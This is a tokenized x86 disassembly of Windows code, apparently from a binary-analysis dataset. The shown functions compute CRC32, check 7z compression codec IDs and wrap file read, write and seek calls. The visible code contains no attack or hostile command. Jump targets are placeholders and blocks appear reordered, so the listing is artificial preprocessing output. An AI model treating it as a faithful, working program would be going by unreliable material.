cmp eax [ ebp - 0x8 ]
jbe r-xdata
push r--data
call sub_40e036
mov eax [ ebp - 0x4 ]
sub eax [ ebp + 0xc ]
mov ebx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x18 ]
add ebx eax
mov [ ebp - 0x8 ] ebx
cmp edx ebx
mov ebx [ ebp + 0x8 ]
jae r-xdata
push 0x8
cmp esi edi
je r-xdata
push 0x0
push [ ebp - 0x8 ]
mov ecx esi
call sub_4026e7
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x18 ]
mov edx [ ebp + 0xc ]
cmp eax edx
ja r-xdata
pop edi
cmp [ esi + 0x14 ] edi
jb r-xdata
cmp ecx ebx
ja r-xdata
pop edi
cmp [ esi + 0x14 ] edi
jb r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
lea edi [ ebx + edx ]
mov [ ebp + 0x10 ] edi
cmp edi ecx
pop edi
ja r-xdata
pop edi
cmp [ esi + 0x14 ] edi
jb r-xdata
mov [ ebp + 0x14 ] esi
mov edx [ esi ]
mov [ ebp + 0x14 ] edx
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] edi
jb r-xdata
cmp [ esi + 0x14 ] edi
jb r-xdata
cmp [ esi + 0x14 ] edi
jb r-xdata
mov [ ebp + 0xc ] esi
mov eax [ esi ]
mov [ ebp + 0xc ] eax
jmp r-xdata
mov [ ebp + 0x10 ] esi
mov edx [ esi ]
mov [ ebp + 0x10 ] edx
jmp r-xdata
cmp [ esi + 0x14 ] edi
jb r-xdata
cmp [ esi + 0x14 ] edi
jb r-xdata
mov eax [ eax ]
mov eax [ ebp + 0xc ]
push [ ebp - 0x4 ]
add eax ebx
lea edx [ edx + eax * 2 ]
mov eax [ ebp + 0x18 ]
add eax ebx
lea ecx [ ecx + eax * 2 ]
call sub_40106c
mov eax [ ebp + 0x10 ]
pop ecx
cmp [ eax + 0x14 ] edi
jb r-xdata
mov [ ebp + 0x8 ] esi
mov eax [ esi ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] edi
jb r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
push eax
mov eax [ ebp + 0x14 ]
lea edx [ eax + ecx * 2 ]
mov eax [ ebp + 0x10 ]
lea ecx [ eax + ebx * 2 ]
call sub_40106c
pop ecx
cmp [ esi + 0x14 ] edi
jb r-xdata
mov [ ebp + 0xc ] esi
mov ecx [ esi ]
mov [ ebp + 0xc ] ecx
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] edi
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] edi
jb r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
push [ ebp - 0x4 ]
lea eax [ ebx + edx ]
mov edx [ ebp + 0xc ]
lea edx [ edx + eax * 2 ]
mov eax [ ebp + 0x18 ]
add eax ebx
lea ecx [ ecx + eax * 2 ]
call sub_40106c
pop ecx
cmp [ esi + 0x14 ] edi
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] edi
jb r-xdata
pop ecx
mov ecx [ ebp - 0x8 ]
mov [ esi + 0x10 ] ecx
cmp [ esi + 0x14 ] edi
jb r-xdata
mov ecx [ ebp + 0x14 ]
push [ ebp + 0x18 ]
lea edx [ eax + ecx * 2 ]
mov eax [ ebp + 0xc ]
lea ecx [ eax + ebx * 2 ]
call sub_40104f
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
push edx
mov edx [ ebp + 0x8 ]
lea edx [ edx + ecx * 2 ]
lea ecx [ eax + ebx * 2 ]
call sub_40106c
pop ecx
cmp [ esi + 0x14 ] edi
jb r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
push [ ebp - 0x4 ]
lea edx [ edx + eax * 2 ]
mov eax [ ebp + 0x18 ]
add eax ebx
lea ecx [ ecx + eax * 2 ]
call sub_40106c
pop ecx
cmp [ esi + 0x14 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] edi
jb r-xdata
call sub_40106c
mov eax [ ebp + 0xc ]
push [ ebp - 0x4 ]
add eax ebx
lea edx [ edx + eax * 2 ]
mov eax [ ebp + 0x18 ]
add eax ebx
lea ecx [ ecx + eax * 2 ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] edi
jb r-xdata
mov [ ebp + 0x10 ] esi
mov eax [ esi ]
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ esi + 0x14 ] edi
jb r-xdata
push [ ebp + 0x18 ]
mov ecx [ ebp + 0x14 ]
xor edx edx
pop edi
mov [ eax + ecx * 2 ] dx
mov eax esi
pop esi
pop ebx
leave
retn 0x14
mov [ ebp + 0x8 ] esi
mov eax [ esi ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov edx [ ebp + 0x10 ]
push [ ebp - 0x4 ]
lea edx [ eax + edx * 2 ]
mov eax [ ebp + 0x18 ]
add eax ebx
lea ecx [ ecx + eax * 2 ]
call sub_40106c
pop ecx
cmp [ esi + 0x14 ] edi
jb r-xdata
lea edx [ edx + ecx * 2 ]
lea ecx [ eax + ebx * 2 ]
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x18 ]
sub ecx [ ebp + 0xc ]
push eax
add ecx eax
mov eax [ ebp + 0x10 ]
jmp r-xdata
mov ebx esi
mov ebx [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] edi
jb r-xdata
mov eax [ ebp + 0x18 ]
sub eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x14 ]
add eax [ ebp + 0x18 ]
lea edx [ ecx + eax * 2 ]
mov eax [ ebp + 0x10 ]
lea ecx [ ebx + eax * 2 ]
sub_403348
push ebp
mov ebp esp
push esi
mov esi ecx
push edi
and [ esi + 0x4 ] 0x0
mov edi edx
test edi edi
jne r-xdata
mov eax [ ebp + 0x8 ]
push edi
push eax
call [ eax ]
pop ecx
pop ecx
mov [ esi ] eax
test eax eax
je r-xdata
and [ esi ] edx
xor eax eax
mov [ esi + 0x4 ] edi
jmp r-xdata
pop edi
pop esi
pop ebp
retn
xor eax eax
inc eax
jmp r-xdata
sub_40338e
push esi
xor edx edx
mov eax ecx
and eax 0x1
dec eax
not eax
and eax 0xedb88320
shr ecx 0x1
xor ecx eax
dec esi
jne r-xdata
mov [ edx * 4 + rw-data ] ecx
inc edx
cmp edx 0x100
jb r-xdata
push 0x8
mov ecx edx
pop esi
mov esi 0x800
jmp r-xdata
cmp edx esi
jb r-xdata
mov ecx [ edx * 4 + rw-data ]
movzx eax cl
shr ecx 0x8
xor ecx [ eax * 4 + rw-data ]
inc edx
mov [ edx * 4 + rw-data ] ecx
mov [ rw-data ] sub_403408
call sub_406999
mov ecx [ rw-data ]
mov edx sub_4034a5
test eax eax
cmove ecx edx
mov [ rw-data ] ecx
pop esi
retn
sub_403408
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
mov ebx edx
mov edx ecx
test esi esi
je r-xdata
cmp esi 0x4
jb r-xdata
test bl 0x3
je r-xdata
test esi esi
je r-xdata
mov eax esi
shr eax 0x2
mov [ ebp + 0x8 ] eax
movzx eax [ ebx ]
xor eax edx
and eax 0xff
shr edx 0x8
xor edx [ edi + eax * 4 ]
inc ebx
dec esi
jne r-xdata
pop edi
pop esi
mov eax edx
pop ebx
pop ebp
retn 0x8
movzx eax [ ebx ]
xor eax edx
and eax 0xff
shr edx 0x8
xor edx [ edi + eax * 4 ]
inc ebx
dec esi
jne r-xdata
xor edx [ ebx ]
sub esi 0x4
mov ecx edx
shr ecx 0x8
and ecx 0xff
mov eax edx
mov ecx [ edi + ecx * 4 + 0x800 ]
shr eax 0x10
and eax 0xff
add ebx 0x4
xor ecx [ edi + eax * 4 + 0x400 ]
movzx eax dl
shr edx 0x18
xor ecx [ edi + eax * 4 + 0xc00 ]
xor ecx [ edi + edx * 4 ]
dec [ ebp + 0x8 ]
mov edx ecx
jne r-xdata
sub_4034ae
push ebp
mov ebp esp
sub esp 0x98
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
and [ ebp - 0x70 ] 0x0
and [ ebp - 0x74 ] 0x0
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x18 ]
mov ebx edx
mov edx [ ecx + 0x10 ]
push edi
push [ ecx + 0x14 ]
lea ecx [ ebp - 0x84 ]
call sub_4083ff
pop ecx
pop ecx
test eax eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40e09b
leave
retn
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0xc ]
xor edx edx
mov [ ebp - 0x5c ] eax
xor eax eax
inc eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x70 ] esi
mov [ ebp - 0x60 ] edx
mov [ ebp - 0x3c ] edx
mov [ ebp - 0x2c ] edx
mov [ ebp - 0x58 ] edx
mov [ ebp - 0x54 ] edx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x88 ] eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push ebx
call [ ebx ]
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
jb r-xdata
push [ ebp - 0x74 ]
push edi
call [ edi + 0x4 ]
pop ecx
pop ecx
mov eax esi
mov eax [ ebp - 0xc ]
mov edx [ ebp + 0x14 ]
mov [ ebp - 0x90 ] eax
mov eax [ ebp - 0x60 ]
mov [ ebp - 0x98 ] eax
lea eax [ ebp - 0x94 ]
push eax
push 0x1
lea eax [ ebp - 0x90 ]
push eax
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x84 ]
call sub_4080c3
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x90 ]
sub ecx edx
add esp 0x10
sub [ ebp - 0x88 ] edx
mov esi eax
mov [ ebp - 0xc ] ecx
sbb [ ebp - 0x8c ] 0x0
test esi esi
jne r-xdata
mov [ ebp - 0xc ] eax
cmp eax 0x40000
jae r-xdata
mov eax [ ebp - 0x5c ]
cmp [ ebp - 0x60 ] eax
je r-xdata
cmp eax [ ebp + 0x14 ]
jne r-xdata
test edx edx
jne r-xdata
xor esi esi
inc esi
test ecx ecx
jne r-xdata
push edx
push ebx
call [ ebx + 0x4 ]
mov esi eax
pop ecx
pop ecx
test esi esi
jne r-xdata
mov eax [ ebp - 0x98 ]
cmp eax [ ebp - 0x60 ]
mov eax [ ebp - 0x5c ]
je r-xdata
cmp [ ebp - 0x94 ] 0x1
je r-xdata
mov eax [ ebp - 0x88 ]
mov ecx [ ebp - 0x8c ]
xor edx edx
jmp r-xdata
cmp [ ebp - 0x94 ] 0x4
je r-xdata
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] 0x40000
cmp ecx edx
ja r-xdata
sub_403620
push ebp
mov ebp esp
sub esp 0xb0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x84 ] 0x0
and [ ebp - 0x88 ] 0x0
cmp [ ecx + 0x14 ] 0x1
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi edx
push edi
mov edi [ ebp + 0x18 ]
mov [ ebp - 0xac ] esi
je r-xdata
mov eax [ ecx + 0x10 ]
lea edx [ ebp - 0xa4 ]
mov cl [ eax ]
call sub_406a46
test eax eax
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40e09b
leave
retn
push edi
push 0x5
lea edx [ ebp - 0xa4 ]
lea ecx [ ebp - 0x98 ]
call sub_4083ff
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax [ ebp + 0x14 ]
xor ecx ecx
mov [ ebp - 0x70 ] eax
xor eax eax
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x84 ] ebx
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x74 ] ecx
mov [ ebp - 0x50 ] ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x6c ] ecx
mov [ ebp - 0x68 ] ecx
mov [ ebp - 0x9c ] eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
push eax
push esi
call [ esi ]
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
jb r-xdata
push [ ebp - 0x88 ]
push edi
call [ edi + 0x4 ]
pop ecx
pop ecx
mov eax esi
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0x14 ]
mov [ ebp - 0xa8 ] eax
mov eax [ ebp - 0x74 ]
mov [ ebp - 0xb0 ] eax
lea eax [ ebp - 0xa4 ]
push eax
push ecx
lea eax [ ebp - 0xa8 ]
push eax
push [ ebp - 0xc ]
lea ecx [ ebp - 0x98 ]
call sub_406b7d
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xa8 ]
sub ecx edx
add esp 0x10
sub ebx edx
sbb [ ebp - 0x9c ] 0x0
mov esi eax
mov [ ebp - 0x8 ] ecx
test esi esi
jne r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx 0x40000
jae r-xdata
mov eax [ ebp - 0x70 ]
cmp [ ebp - 0x74 ] eax
je r-xdata
cmp eax [ ebp + 0x14 ]
jne r-xdata
test edx edx
jne r-xdata
xor esi esi
inc esi
test ecx ecx
jne r-xdata
mov eax [ ebp - 0xac ]
push edx
push eax
call [ eax + 0x4 ]
mov esi eax
pop ecx
pop ecx
test esi esi
jne r-xdata
mov eax [ ebp - 0xb0 ]
cmp eax [ ebp - 0x74 ]
mov eax [ ebp - 0x70 ]
je r-xdata
cmp [ ebp - 0xa4 ] 0x1
je r-xdata
mov esi [ ebp - 0xac ]
mov eax [ ebp - 0x9c ]
xor ecx ecx
jmp r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] 0x40000
cmp eax ecx
ja r-xdata
sub_4037cb
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
mov [ ebp - 0x10 ] edx
mov ebx ecx
test edi edi
je r-xdata
test esi esi
jne r-xdata
mov [ ebp - 0x8 ] 0x40000
test edi edi
ja r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
push eax
push ebx
call [ ebx ]
add esp 0xc
test eax eax
jne r-xdata
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40e09b
leave
retn
cmp [ ebp - 0x8 ] eax
je r-xdata
mov [ ebp - 0x8 ] esi
cmp esi 0x40000
jae r-xdata
push 0x6
pop eax
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
call sub_410100
mov eax [ ebp - 0x10 ]
add eax [ ebp - 0x8 ]
push [ ebp - 0x8 ]
sub esi [ ebp - 0x8 ]
push ebx
mov [ ebp - 0x10 ] eax
sbb edi 0x0
call [ ebx + 0x4 ]
add esp 0x14
test eax eax
jne r-xdata
test edi edi
ja r-xdata
jb r-xdata
sub_403867
xor eax eax
inc eax
cmp [ ecx ] eax
jne r-xdata
xor eax eax
cmp [ ecx + 0x4 ] eax
jne r-xdata
cmp [ ecx + 0xc ] 0x0
ja r-xdata
jb r-xdata
mov ecx [ ecx + 0x8 ]
test ecx ecx
je r-xdata
cmp [ ecx + 0x8 ] 0xffffffff
ja r-xdata
retn
cmp ecx 0x21
je r-xdata
cmp ecx 0x30101
je r-xdata
sub_403898
push ebx
push esi
push edi
mov edx ecx
push 0x4
mov edi [ edx + 0x10 ]
pop ebx
cmp edi 0x1
jb r-xdata
mov eax ebx
cmp edi ebx
ja r-xdata
mov esi [ edx ]
mov ecx esi
call sub_403867
test eax eax
je r-xdata
xor eax eax
inc eax
cmp edi eax
jne r-xdata
cmp edi 0x2
jne r-xdata
cmp [ edx + 0x18 ] eax
jne r-xdata
cmp edi ebx
jne r-xdata
xor ecx ecx
cmp [ esi + 0x24 ] ecx
ja r-xdata
mov eax [ edx + 0x8 ]
xor ecx ecx
cmp [ eax ] ecx
jne r-xdata
lea ecx [ esi + 0x18 ]
call sub_403867
test eax eax
je r-xdata
jb r-xdata
cmp [ edx + 0x14 ] ecx
lea ecx [ esi + 0x30 ]
call sub_403867
test eax eax
je r-xdata
cmp [ esi + 0x18 ] eax
jne r-xdata
cmp [ esi + 0x20 ] 0xffffffff
ja r-xdata
xor eax eax
jmp r-xdata
cmp [ esi + 0x50 ] 0x303011b
jne r-xdata
cmp [ esi + 0x1c ] eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
xor ecx ecx
cmp [ esi + 0x54 ] ecx
jne r-xdata
cmp [ edx + 0x18 ] eax
jne r-xdata
cmp [ esi + 0x48 ] ebx
jne r-xdata
mov eax [ edx + 0x8 ]
cmp [ eax ] ecx
jne r-xdata
cmp [ esi + 0x4c ] 0x1
jne r-xdata
cmp [ edx + 0x14 ] 0x1
jne r-xdata
cmp [ edx + 0x18 ] ebx
jne r-xdata
mov eax [ edx + 0x4 ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ edx + 0x8 ]
cmp [ eax ] 0x2
jne r-xdata
cmp [ eax + 0x4 ] ecx
jne r-xdata
cmp [ eax + 0x4 ] 0x6
jne r-xdata
cmp [ esi + 0x20 ] 0x3030103
je r-xdata
cmp [ eax + 0x8 ] 0x1
jne r-xdata
cmp [ esi + 0x20 ] 0x3030501
jmp r-xdata
cmp [ eax + 0xc ] ecx
jne r-xdata
jne r-xdata
cmp [ edx + 0x14 ] 0x3
jne r-xdata
mov eax [ edx + 0x4 ]
cmp [ eax ] 0x5
jne r-xdata
cmp [ eax + 0x4 ] ecx
jne r-xdata
cmp [ eax + 0x8 ] ebx
jne r-xdata
cmp [ eax + 0xc ] 0x1
jne r-xdata
cmp [ eax + 0x10 ] 0x3
jne r-xdata
cmp [ eax + 0x14 ] 0x2
jmp r-xdata
sub_4039ed
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
mov edi edx
xorps xmm0 xmm0
movlpd [ ebp - 0x8 ] xmm0
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
xor esi esi
test edi edi
je r-xdata
pop edi
pop esi
leave
retn
add eax [ ecx + esi * 8 ]
adc edx [ ecx + esi * 8 + 0x4 ]
inc esi
cmp esi edi
jb r-xdata
sub_403a1a
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
xor esi esi
push edi
mov edi edx
mov ebx ecx
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x30 ] esi
mov [ ebp - 0x2c ] esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x18 ] esi
call sub_403898
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebx + 0x10 ]
mov ecx esi
mov [ ebp - 0x20 ] esi
test eax eax
je r-xdata
xor eax eax
mov edx [ ebp - 0x14 ]
mov ebx ecx
imul ebx ebx 0x18
add ebx [ edx ]
mov [ ebp - 0x24 ] ebx
mov edx [ ebx + 0x8 ]
test edx edx
je r-xdata
mov edi [ ebp + 0x18 ]
mov [ ebp - 0x8 ] esi
mov esi [ ebp + 0x14 ]
cmp eax 0x4
jne r-xdata
cmp edx 0x21
je r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_4039ed
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
add eax [ ebp + 0xc ]
mov ecx [ ebx + ecx * 8 ]
adc edx [ ebp + 0x10 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp - 0x8 ]
push edx
mov ecx [ ebx + ecx * 8 + 0x4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp + 0x8 ]
push eax
call sub_4062f5
mov ebx [ ebp - 0x24 ]
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
xor esi esi
mov eax [ eax + 0xc ]
mov [ ebp - 0x3c ] 0x3
mov edi [ eax + ecx * 8 ]
mov edx [ eax + ecx * 8 + 0x4 ]
mov eax ecx
shl eax 0x2
mov [ ebp - 0x38 ] 0x2
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x10 ] eax
mov eax [ ebp + eax - 0x3c ]
mov [ ebp - 0x8 ] eax
cmp ecx 0x2
jae r-xdata
cmp edx 0x30101
je r-xdata
mov ecx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
or eax ecx
jne r-xdata
jne r-xdata
mov [ ebp - 0xc ] edi
cmp edi edi
jne r-xdata
mov eax [ ebx + 0xc ]
cmp edx 0x303011b
jne r-xdata
xor edx edx
cmp [ ebx + 0x8 ] 0x30101
jne r-xdata
mov ecx [ ebp - 0x10 ]
cmp ecx edi
jne r-xdata
push 0x4
jmp r-xdata
cmp edx esi
ja r-xdata
push 0x2
cmp esi edx
jne r-xdata
cmp ecx 0x1
jne r-xdata
cmp eax esi
jne r-xdata
cmp [ ebx + 0x8 ] 0x21
jne r-xdata
cmp ecx edx
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
cmp eax edx
jne r-xdata
pop eax
jmp r-xdata
push 0x5
jmp r-xdata
jb r-xdata
mov eax [ ebp + 0x1c ]
push edi
push eax
call [ eax ]
mov esi eax
pop ecx
pop ecx
test esi esi
jne r-xdata
cmp edx 0x3030103
jne r-xdata
mov eax [ edi ]
mov edx [ edi + 0x4 ]
mov esi [ edi + 0x8 ]
mov edi [ edi + 0xc ]
cmp ecx 0x3
jne r-xdata
cmp ecx edx
jne r-xdata
push [ ebp + 0x1c ]
mov edx [ ebp + 0x8 ]
push edi
push esi
push [ ebp - 0xc ]
mov ecx ebx
push [ ebp - 0x10 ]
call sub_4034ae
jmp r-xdata
push eax
push ecx
mov ecx [ ebp + 0x8 ]
mov edx esi
call sub_4037cb
pop ecx
pop ecx
jmp r-xdata
mov esi [ ebp + 0x14 ]
sub esi edi
add esi [ ebp + 0x18 ]
mov [ ebp - 0xc ] edi
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] edi
cmp edi [ ebp + 0x18 ]
ja r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x20 ]
neg eax
mov [ eax + ecx + 0x4 ] esi
mov [ ebp + eax - 0x2c ] edi
jmp r-xdata
test edi edi
jne r-xdata
cmp edx 0x3030501
jne r-xdata
cmp eax esi
jne r-xdata
add eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
adc edx [ ebp + 0x10 ]
push edx
push eax
call sub_4062f5
pop ecx
pop ecx
test eax eax
jne r-xdata
push [ ebp + 0x1c ]
mov edx [ ebp + 0x8 ]
push edi
push esi
push [ ebp - 0xc ]
mov ecx ebx
push [ ebp - 0x10 ]
call sub_403620
add esp 0x14
test eax eax
jne r-xdata
mov edi [ ebp - 0xc ]
cmp eax esi
jne r-xdata
mov edx [ ebp + 0x18 ]
push ecx
lea eax [ ebp - 0x10 ]
push eax
push ecx
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x10 ] esi
call sub_40676d
add esp 0xc
jmp r-xdata
cmp esi esi
jne r-xdata
mov edi [ ebp - 0x4 ]
xor esi esi
mov edx [ ebp + 0x18 ]
push ecx
push ecx
mov ecx [ ebp + 0x14 ]
call sub_40670c
pop ecx
pop ecx
jmp r-xdata
mov ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
inc ecx
mov eax [ eax + 0x10 ]
mov [ ebp - 0x20 ] ecx
cmp ecx eax
jb r-xdata
xor edx edx
cmp edx edi
jne r-xdata
mov eax [ ebp + 0x1c ]
push esi
push eax
call [ eax ]
pop ecx
pop ecx
mov ecx [ ebp + 0x20 ]
mov [ ecx + 0x8 ] eax
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
push edi
push esi
mov edx eax
call sub_4037cb
pop ecx
pop ecx
test eax eax
jne r-xdata
test esi esi
jne r-xdata
push [ ebp + 0x18 ]
mov eax [ ebp + 0x20 ]
push [ ebp + 0x14 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x18 ]
push esi
push [ eax + 0x8 ]
push [ ebp - 0x2c ]
push [ eax + 0x4 ]
push [ ebp - 0x30 ]
push [ eax ]
call sub_40644a
add esp 0x20
jmp r-xdata
sub_403d2f
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x1c ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov [ ebp - 0x14 ] ecx
lea ecx [ ebp - 0x10 ]
push ecx
mov ecx [ ebp - 0x14 ]
push ebx
push [ ebp + 0x18 ]
xor edi edi
push eax
push [ ebp + 0x10 ]
mov [ ebp - 0x10 ] edi
push [ ebp + 0xc ]
mov [ ebp - 0xc ] edi
push esi
mov [ ebp - 0x8 ] edi
call sub_403a1a
add esp 0x1c
mov esi eax
push [ ebp + edi * 4 - 0x10 ]
push ebx
call [ ebx + 0x4 ]
inc edi
pop ecx
pop ecx
cmp edi 0x3
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_40e09b
leave
retn
sub_403d97
push esi
mov esi ecx
cmp [ esi ] 0xffffffff
je r-xdata
xor eax eax
pop esi
retn
push [ esi ]
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
or [ esi ] 0xffffffff
pop esi
jmp [ GetLastError@IAT ]
sub_403db9
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov ebx edx
mov esi [ edi ]
mov [ ebp - 0xc ] ecx
test esi esi
jne r-xdata
and [ edi ] 0x0
mov edx __dos_header
xor eax eax
jmp r-xdata
call [ GetLastError@IAT ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40e09b
leave
retn
mov ecx [ ebp - 0xc ]
mov edx __dos_header
test esi esi
jne r-xdata
and [ ebp - 0x8 ] 0x0
push 0x0
lea eax [ ebp - 0x8 ]
push eax
cmp esi edx
mov eax esi
cmova eax edx
push eax
push ebx
push [ ecx ]
call [ ReadFile@IAT ]
mov ecx [ ebp - 0x8 ]
add [ edi ] ecx
add ebx ecx
sub esi ecx
test eax eax
je r-xdata
jmp r-xdata
sub_403e35
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov ebx edx
mov esi [ edi ]
mov [ ebp - 0xc ] ecx
test esi esi
jne r-xdata
and [ edi ] 0x0
mov edx __dos_header
xor eax eax
jmp r-xdata
call [ GetLastError@IAT ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40e09b
leave
retn
mov ecx [ ebp - 0xc ]
mov edx __dos_header
test esi esi
jne r-xdata
and [ ebp - 0x8 ] 0x0
push 0x0
lea eax [ ebp - 0x8 ]
push eax
cmp esi edx
mov eax esi
cmova eax edx
push eax
push ebx
push [ ecx ]
call [ WriteFile@IAT ]
mov ecx [ ebp - 0x8 ]
add [ edi ] ecx
add ebx ecx
sub esi ecx
test eax eax
je r-xdata
jmp r-xdata
sub_403eb1
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi edx
mov ebx ecx
mov esi [ edi ]
mov edx [ edi + 0x4 ]
mov eax esi
mov cl 0x20
mov [ ebp - 0xc ] esi
call sub_41cf90
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
sub eax 0x0
je r-xdata
xor eax eax
dec eax
je r-xdata
mov eax [ ebp - 0x8 ]
cdq
xor ecx ecx
or ecx esi
mov [ edi + 0x4 ] eax
mov [ edi ] ecx
xor eax eax
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
dec eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40e09b
leave
retn
mov esi [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push esi
push [ ebx ]
call [ SetFilePointer@IAT ]
mov esi eax
mov [ ebp - 0xc ] esi
cmp esi 0xffffffff
jne r-xdata
push 0x2
pop eax
jmp r-xdata
push 0x57
pop eax
jmp r-xdata
sub_403f3e
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
